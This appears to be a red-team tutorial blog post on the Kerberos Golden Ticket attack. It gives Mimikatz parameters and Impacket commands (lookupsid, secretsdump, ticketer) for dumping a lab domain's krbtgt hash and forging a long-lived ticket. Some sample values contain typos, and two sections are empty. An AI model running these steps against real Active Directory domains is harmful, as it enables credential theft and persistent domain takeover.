---
title:  "Kerberos attacks 4-golden Ticket "
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: "Kerberos attacks 4-golden Ticket"
categories:
  - Red-Teaming
toc: true
---

## golden Ticket
* is a famous technique of impersonating users on an AD domain by abusing Kerberos authentication
* A Golden Ticket is a type of attack in which an adversary gains control over an Active Directory Key Distribution Service Account (KRBTGT), and uses that account to forge valid Kerberos Ticket Granting Tickets (TGTs). This gives the attacker access to any resource on an Active Directory Domain
* Golden Ticket give attackers unrestricted access to networked resources and the ability to forge new tickets, allowing them to reside on networks indefinitely by being disguised as credentialed administrator-level users.






## Forging Kerberos Tickets
* Forging Kerberos tickets depends on the password hash available to the attacker
* Golden Ticket requires the KRBTGT password hash.
* Silver ticket requires the Service Account (either the computer account or user account) password hash.
* Create anywhere and user anywhere on the network, without elevated rights.

## requirements for forging TGT
 * Domain Name
 * SID
 * Domain KRBTGT Account NTLM password hash
 * Impersonate user
 
 
```
kerberos::golden  ## Name of the module  
/user:Administrator  ## username of which the TGT is generated
/domain:karim.net  ## Domain 
/sid:5-1-5-21-268341927-4156871508- 1792461683  ## SID of the domain 
/krbtgt:a9b30e5bOdc865eadcea9411e4ade72d   NTLM (RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys. 
/id:500 /groups:512 Optional User RID (default 500) and Group default 513 512 520 518 519)
/ptt  ## Injects the ticket in current PowerShell process ,no need to save the ticket on disk 
/startoffset:0  ##Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future. 
/endin:600  ##Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes 
/renewmax:10080  ##Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 
```
## golden ticket with Mimikatz
## golden ticket with Impacket
used for lookupid python script to enumerate the Domain SID.
```
python3 lookupsid.py user/Administrator:password@ip
python3 lookupsid.py admin/Administrator:p@ssw0rd@192.168.128.140
```

<img src="/img/golden/sidk.PNG" alt="Getting-gz" width="800" height="150"> 

used secretsdump.py the python script for extracting Krbtgt hash
```
python3 secretsdump.py administrator:p@ssw0rd@192.168.128.140 -outputfile krbhash -user-status   
```

<img src="/img/golden/secretdump.PNG" alt="Getting-gz" width="800" height="150"> 

Use ticketer.py script that will create TGT/TGS tickets,Tickets duration is fixed to 10 years from now.
```
sudo ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
sudo python3 ticketer.py -nthash 564e72d3c6c1927de1d2f252665e7c54 -domain-sid S-1-5-21-750046758-1551849808-2392872301 -domain karim.net admin
```

<img src="/img/golden/crer.PNG" alt="Getting-gz" width="800" height="150"> 


## golden ticket with Rubeus.exe
